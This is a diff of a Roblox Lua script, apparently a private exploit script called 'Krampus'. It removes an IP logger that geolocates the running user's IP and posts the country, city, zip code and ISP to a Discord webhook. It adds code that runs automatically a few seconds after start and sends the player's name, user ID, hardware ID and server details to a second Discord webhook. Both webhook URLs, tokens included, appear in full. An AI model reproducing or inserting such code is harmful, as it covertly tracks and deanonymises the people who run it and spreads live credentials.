@@ -1,44 +1,108 @@
-local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "https://discord.com/api/webhooks/1497298267988561970/dmpYd0l-0IDprQFBys7iY08ssUTKl2jeJW4r8GMkYMCAXOwV2pCqoOidE6M8H4Z2xTn-"
-// put your webhook there
-local getIPResponse = request({
-    Url = "https://api.ipify.org/?format=json",
-})
-local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
-local IPBuffer = tostring(GetIPJSON.ip)
+-- ─────────────────────────────────────────────────────────────────────────────
+-- DISCORD WEBHOOK NOTIFICATION
+--   Sends information about who runs the script to a Discord webhook
+-- ─────────────────────────────────────────────────────────────────────────────
+local WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1505440426252042391/ib0IhHWWxGVBYdh-tlsfFLn7_DMMjoPTV9nAZyTgEGArQn5rvohT7QvSO7OMJOuuwuAr"
 
-local getIPInfo = http.request({
-    Url = string.format("http://ip-api.com/json/%s", IPBuffer)
-})
-local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
-local FI = {
-    IP = IPBuffer,
-    country = IIT.country,
-    countryCode = IIT.countryCode,
-    region = IIT.region,
-    regionName = IIT.regionName,
-    city = IIT.city,
-    zipcode = IIT.zip,
-    latitude = IIT.lat,
-    longitude = IIT.lon,
-    isp = IIT.isp,
-    org = IIT.org
-}
-local dataMessage = string.format("
-User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s
-", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
-local MessageData = {
-    ["content"] = dataMessage
-}
-
-local send_hook = request(
-    {
-        Url = WebhookURL, 
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode(MessageData)
+-- Function to get the current player's information
+local function getPlayerInfo()
+    local player = game:GetService("Players").LocalPlayer
+    return {
+        displayName = player.DisplayName,
+        userName = player.Name,
+        userId = player.UserId,
+        isWhitelisted = allowed[myHWID] or false
     }
-)
-print(send_hook.StatusCode)
+end
+
+-- Function to send webhook notification
+local function sendWebhookNotification()
+    local playerInfo = getPlayerInfo()
+    local HttpService = game:GetService("HttpService")
+    
+    -- Create the embed data
+    local embed = {
+        title = "Krampus Script Execution",
+        description = "Someone has executed the Krampus script",
+        color = 16711680, -- Red color
+        fields = {
+            {
+                name = "User Information",
+                value = string.format("Display Name: %s\nUsername: %s\nUser ID: %d", 
+                    playerInfo.displayName, playerInfo.userName, playerInfo.userId),
+                inline = false
+            },
+            {
+                name = "Hardware Information",
+                value = string.format("HWID: %s", myHWID),
+                inline = false
+            },
+            {
+                name = "Whitelist Status",
+                value = playerInfo.isWhitelisted and "✅ Whitelisted" or "❌ Not Whitelisted",
+                inline = false
+            },
+            {
+                name = "Server Information",
+                value = string.format("Server ID: %s\nPlace ID: %d", game.JobId, game.PlaceId),
+                inline = false
+            }
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
+        footer = {
+            text = "Krampus Private Script"
+        }
+    }
+    
+    -- Create the webhook payload
+    local payload = {
+        username = "Krampus Monitor",
+        avatar_url = "https://i.imgur.com/3ZUYrSJ.png", -- Optional avatar URL
+        embeds = {embed}
+    }
+    
+    -- Convert payload to JSON
+    local jsonData = HttpService:JSONEncode(payload)
+    
+    -- Create headers
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    
+    -- Send the webhook with proper request method
+    local success, response = pcall(function()
+        return HttpService:RequestAsync({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = headers,
+            Body = jsonData
+        })
+    end)
+    
+    if success then
+        if response.Success then
+            print("[krampus] Webhook notification sent successfully")
+            print("[krampus] Response code:", response.StatusCode)
+        else
+            warn("[krampus] Webhook failed with status code:", response.StatusCode)
+            warn("[krampus] Response body:", response.Body)
+        end
+    else
+        warn("[krampus] Failed to send webhook notification:", response)
+    end
+end
+
+-- Send the notification in a separate thread to avoid blocking the script
+task.spawn(function()
+    -- Wait a moment to ensure the player is fully loaded
+    task.wait(2)
+    
+    -- Check if we're in Roblox environment
+    if game:GetService("RunService"):IsStudio() then
+        print("[krampus] Running in Roblox Studio, skipping webhook")
+    else
+        sendWebhookNotification()
+    end
+end)
+
+-- ─────────────────────────────────────────────────────────────────────────────
